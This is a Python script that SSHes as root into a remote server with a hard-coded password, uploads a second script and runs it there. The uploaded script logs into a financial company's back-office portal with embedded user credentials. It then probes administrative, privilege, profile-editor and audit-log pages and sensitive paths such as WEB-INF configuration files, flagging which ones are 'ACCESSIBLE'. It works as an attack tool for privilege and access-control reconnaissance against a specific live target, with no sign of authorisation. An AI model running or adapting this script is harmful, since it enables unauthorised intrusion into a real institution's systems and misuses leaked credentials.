import paramiko, sys

ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
ssh.connect('64.177.88.10', username='root', password='5F.jyTK$D6%.F{a=', timeout=10)
print('Connected', flush=True)

SCRIPT = r'''
import requests, urllib3, json, sys, re
urllib3.disable_warnings()
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"

s = requests.Session()
s.verify = False
s.headers.update({"User-Agent": UA})

# LOGIN
r0 = s.get("https://core.findep.mx/", timeout=10)
token_m = re.search(r'name="cve_idToken"\s+value="([^"]*)"', r0.text)
tok = token_m.group(1) if token_m else ""
r = s.post("https://core.findep.mx/valida.do",
    data={"cve_idToken": tok, "msjPass": "", "cveUsr": "jcruzval",
          "cve_usr": "jcruzval", "cve_psd": "Fisa1234*", "ok_btn": "Entrar"},
    allow_redirects=True, timeout=15)
sys.stdout.write(f"Login: {len(r.text)}b\n\n")

# ====================================================
# 1. adm_de_perfil.do — THE REAL PROFILE EDITOR
# ====================================================
sys.stdout.write("="*60 + "\n=== adm_de_perfil.do ===\n" + "="*60 + "\n\n")
r = s.get("https://core.findep.mx/backoffice/adm_de_perfil.do", timeout=15)
sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")
sys.stdout.write(r.text + "\n\n")

# ====================================================
# 2. sol_privilegio.do?operacion=1
# ====================================================
sys.stdout.write("="*60 + "\n=== sol_privilegio.do?operacion=1 ===\n" + "="*60 + "\n\n")
r = s.get("https://core.findep.mx/backoffice/sol_privilegio.do?operacion=1", timeout=15)
sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")
sys.stdout.write(r.text + "\n\n")

# ====================================================
# 3. bcko_monitor_sol.do — Request monitor
# ====================================================
sys.stdout.write("="*60 + "\n=== bcko_monitor_sol.do ===\n" + "="*60 + "\n\n")
r = s.get("https://core.findep.mx/backoffice/bcko_monitor_sol.do", timeout=15)
sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")
# Extract key data
forms = re.findall(r'<form[^>]*(?:action="([^"]*)")?[^>]*(?:name="([^"]*)")?', r.text)
sys.stdout.write(f"Forms: {[(a,n) for a,n in forms if a or n]}\n")
selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
for sel_name, sel_body in selects:
    options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
    sys.stdout.write(f"Select '{sel_name}': {options[:20]}\n")
inputs = re.findall(r'<input[^>]+name="([^"]+)"(?:[^>]+value="([^"]*)")?', r.text)
sys.stdout.write(f"Inputs: {inputs[:20]}\n")
sys.stdout.write(f"\nBody: {r.text[:3000]}\n")

# ====================================================
# 4. adm_cat.do — Component admin
# ====================================================
sys.stdout.write("\n" + "="*60 + "\n=== adm_cat.do ===\n" + "="*60 + "\n\n")
r = s.get("https://core.findep.mx/backoffice/adm_cat.do", timeout=15)
sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")
if "NoValidado" not in r.text and len(r.text) > 3000:
    sys.stdout.write(f"ACCESSIBLE!\n")
    selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
    for sel_name, sel_body in selects:
        options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
        sys.stdout.write(f"Select '{sel_name}' ({len(options)}): {options[:30]}\n")
    sys.stdout.write(f"Body: {r.text[:3000]}\n")
elif "NoValidado" in r.text:
    sys.stdout.write("BLOCKED (NoValidado)\n")
else:
    sys.stdout.write(f"Body: {r.text[:1000]}\n")

# ====================================================
# 5. Bitacora.do — Audit log
# ====================================================
sys.stdout.write("\n" + "="*60 + "\n=== Bitacora.do ===\n" + "="*60 + "\n\n")
r = s.get("https://core.findep.mx/Bitacora.do", timeout=15)
sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")
if "NoValidado" not in r.text and len(r.text) > 3000:
    sys.stdout.write(f"ACCESSIBLE!\n")
    selects = re.findall(r'<select[^>]+name="([^"]+)"[^>]*>(.*?)</select>', r.text, re.S)
    for sel_name, sel_body in selects:
        options = re.findall(r'<option[^>]*value="([^"]*)"[^>]*>([^<]*)', sel_body)
        sys.stdout.write(f"Select '{sel_name}' ({len(options)}): {options[:15]}\n")
    inputs = re.findall(r'<input[^>]+name="([^"]+)"(?:[^>]+value="([^"]*)")?', r.text)
    sys.stdout.write(f"Inputs: {inputs[:20]}\n")
    sys.stdout.write(f"Body: {r.text[:3000]}\n")
elif "NoValidado" in r.text:
    sys.stdout.write("BLOCKED (NoValidado)\n")

# ====================================================
# 6. admon_contenidos.do — Content admin
# ====================================================
sys.stdout.write("\n=== admon_contenidos.do ===\n")
r = s.get("https://core.findep.mx/backoffice/admon_contenidos.do", timeout=15)
sys.stdout.write(f"[{r.status_code}] {len(r.text)}b\n")
if "NoValidado" not in r.text and len(r.text) > 3000:
    sys.stdout.write(f"ACCESSIBLE!\n{r.text[:2000]}\n")
elif "NoValidado" in r.text:
    sys.stdout.write("BLOCKED\n")

# ====================================================
# 7. More Struts paths - check for direct access
# ====================================================
sys.stdout.write("\n=== STRUTS/DIRECT PATHS ===\n")
paths = [
    "/admin/", "/admin.do", "/console/", "/manager/",
    "/status", "/status.do", "/server-info",
    "/WEB-INF/web.xml", "/WEB-INF/struts-config.xml",
    "/backoffice/adm_de_perfil.do?operacion=2",
    "/backoffice/adm_de_perfil.do?action=edit&id=1",
    "/backoffice/adm_de_perfil.do?action=edit&cve_usr=jcruzval",
    "/backoffice/sol_privilegio.do?operacion=2",
    "/backoffice/sol_privilegio.do?operacion=3",
]
for p in paths:
    try:
        r = s.get(f"https://core.findep.mx{p}", timeout=8, allow_redirects=False)
        if r.status_code not in [404, 400] and len(r.text) not in [1071, 1149]:
            sys.stdout.write(f"  [{r.status_code}] {p} ({len(r.text)}b)\n")
            if "NoValidado" in r.text:
                sys.stdout.write(f"    BLOCKED\n")
            elif r.status_code == 200 and len(r.text) > 2000:
                title = re.search(r'<title>(.*?)</title>', r.text[:2000])
                sys.stdout.write(f"    Title: {title.group(1) if title else 'N/A'}\n")
                sys.stdout.write(f"    Snippet: {r.text[:500]}\n")
    except:
        pass
    sys.stdout.flush()

sys.stdout.write("\n=== DONE ===\n")
sys.stdout.flush()
'''

sftp = ssh.open_sftp()
with sftp.open('/root/core_adm.py', 'w') as f:
    f.write(SCRIPT)
sftp.close()
print('Uploaded', flush=True)

stdin, stdout, stderr = ssh.exec_command('python3 -u /root/core_adm.py 2>&1', timeout=180)
out = stdout.read().decode(errors='replace')
print(out, flush=True)
ssh.close()
print('Fin.', flush=True)
